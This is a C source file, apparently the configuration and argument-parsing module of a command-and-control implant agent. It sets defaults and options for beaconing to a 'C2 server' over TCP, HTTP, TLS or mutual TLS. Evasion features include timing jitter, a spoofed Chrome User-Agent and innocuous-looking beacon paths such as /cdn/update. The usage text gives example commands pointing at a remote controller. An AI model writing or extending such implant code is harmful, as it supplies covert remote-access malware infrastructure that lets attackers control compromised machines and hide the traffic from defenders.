#include "../include/Config.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void AgentConfigDefaults(AgentConfig *C)
{
    memset(C, 0, sizeof(*C));
    C->Mode      = ModeTcp;
    C->Port      = 4444;
    C->BeaconMs  = 3000;
    C->JitterPct = 15;
    strncpy(C->Host,      "127.0.0.1",         AddrSize   - 1);
    strncpy(C->HttpPath,  "/update",            MaxPathLen - 1);
    strncpy(C->UserAgent, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                          "AppleWebKit/537.36 (KHTML, like Gecko) "
                          "Chrome/124.0.0.0 Safari/537.36", MaxUaLen - 1);
    strncpy(C->CertFile,  "certs/agent-1/agent.crt", MaxPathLen - 1);
    strncpy(C->KeyFile,   "certs/agent-1/agent.key", MaxPathLen - 1);
    strncpy(C->CaFile,    "certs/agent-1/ca.crt",    MaxPathLen - 1);
}

static void SetMode(AgentConfig *C, const char *M)
{
    if      (!strcmp(M, "raw")   || !strcmp(M, "tcp"))   C->Mode = ModeTcp;
    else if (!strcmp(M, "http"))                          C->Mode = ModeHttp;
    else if (!strcmp(M, "https"))                         C->Mode = ModeHttps;
    else if (!strcmp(M, "tls"))                           C->Mode = ModeTls;
    else if (!strcmp(M, "mtls"))                          C->Mode = ModeMtls;
    else fprintf(stderr, "[!] Unknown mode '%s' — defaulting to tcp\n", M);
}

void AgentConfigParse(int Argc, char *Argv[], AgentConfig *C)
{
    for (int I = 1; I < Argc; I++) {
        const char *A = Argv[I];
        int HasNext   = (I + 1 < Argc);

        if      ((!strcmp(A, "-s")       || !strcmp(A, "-host"))    && HasNext) strncpy(C->Host,      Argv[++I], AddrSize   - 1);
        else if ((!strcmp(A, "-p")       || !strcmp(A, "-port"))    && HasNext) C->Port = atoi(Argv[++I]);
        else if ((!strcmp(A, "-m")       || !strcmp(A, "-mode"))    && HasNext) SetMode(C, Argv[++I]);
        else if ((!strcmp(A, "--cert")   || !strcmp(A, "-cert"))    && HasNext) strncpy(C->CertFile,  Argv[++I], MaxPathLen - 1);
        else if ((!strcmp(A, "--key")    || !strcmp(A, "-key"))     && HasNext) strncpy(C->KeyFile,   Argv[++I], MaxPathLen - 1);
        else if ((!strcmp(A, "--ca")     || !strcmp(A, "-ca"))      && HasNext) strncpy(C->CaFile,    Argv[++I], MaxPathLen - 1);
        else if ((!strcmp(A, "--path")   || !strcmp(A, "-path"))    && HasNext) strncpy(C->HttpPath,  Argv[++I], MaxPathLen - 1);
        else if ((!strcmp(A, "--ua")     || !strcmp(A, "-ua"))      && HasNext) strncpy(C->UserAgent, Argv[++I], MaxUaLen   - 1);
        else if ((!strcmp(A, "--beacon") || !strcmp(A, "-beacon"))  && HasNext) C->BeaconMs  = atoi(Argv[++I]);
        else if ((!strcmp(A, "--jitter") || !strcmp(A, "-jitter"))  && HasNext) C->JitterPct = atoi(Argv[++I]);
        else if (!strcmp(A, "--help")    || !strcmp(A, "-h"))       AgentConfigUsage(Argv[0]);
    }
}

void AgentConfigUsage(const char *Bin)
{
    fprintf(stderr, "\nUsage: %s [options]\n", Bin);
    fprintf(stderr, "\n");
    fprintf(stderr, "  Connection\n");
    fprintf(stderr, "    -s, -host    <addr>   C2 server address       (default: 127.0.0.1)\n");
    fprintf(stderr, "    -p, -port    <port>   C2 server port           (default: 4444)\n");
    fprintf(stderr, "    -m, -mode    <mode>   Transport mode           (default: tcp)\n");
    fprintf(stderr, "\n");
    fprintf(stderr, "  Modes\n");
    fprintf(stderr, "    raw / tcp             Plain TCP socket\n");
    fprintf(stderr, "    http                  HTTP POST beacon\n");
    fprintf(stderr, "    https                 HTTP over TLS (server cert not verified)\n");
    fprintf(stderr, "    tls                   Raw TLS socket (server cert not verified)\n");
    fprintf(stderr, "    mtls                  Mutual TLS — requires --cert --key --ca\n");
    fprintf(stderr, "\n");
    fprintf(stderr, "  TLS / mTLS\n");
    fprintf(stderr, "    --cert, -cert <file>  Client certificate       (default: certs/agent-1/agent.crt)\n");
    fprintf(stderr, "    --key,  -key  <file>  Client private key       (default: certs/agent-1/agent.key)\n");
    fprintf(stderr, "    --ca,   -ca   <file>  CA certificate for mTLS  (default: certs/agent-1/ca.crt)\n");
    fprintf(stderr, "\n");
    fprintf(stderr, "  HTTP / HTTPS\n");
    fprintf(stderr, "    --path, -path <path>  Beacon URL path          (default: /update)\n");
    fprintf(stderr, "    --ua,   -ua   <str>   User-Agent header string\n");
    fprintf(stderr, "\n");
    fprintf(stderr, "  Timing\n");
    fprintf(stderr, "    --beacon, -beacon <ms>  Beacon interval ms     (default: 3000)\n");
    fprintf(stderr, "    --jitter, -jitter <pct> Jitter percent         (default: 15)\n");
    fprintf(stderr, "\n");
    fprintf(stderr, "  Examples\n");
    fprintf(stderr, "    %s -s 10.10.10.1 -p 4444 -mode raw\n", Bin);
    fprintf(stderr, "    %s -s 10.10.10.1 -p 8080 -mode http --path /cdn/update\n", Bin);
    fprintf(stderr, "    %s -s 10.10.10.1 -p 443  -mode tls\n", Bin);
    fprintf(stderr, "    %s -s 10.10.10.1 -p 443  -mode https --path /api/check\n", Bin);
    fprintf(stderr, "    %s -s 10.10.10.1 -p 4444 -mode mtls \\\n", Bin);
    fprintf(stderr, "         --cert certs/agent-1/agent.crt \\\n");
    fprintf(stderr, "         --key  certs/agent-1/agent.key \\\n");
    fprintf(stderr, "         --ca   certs/agent-1/ca.crt\n");
    fprintf(stderr, "\n");
    exit(0);
}
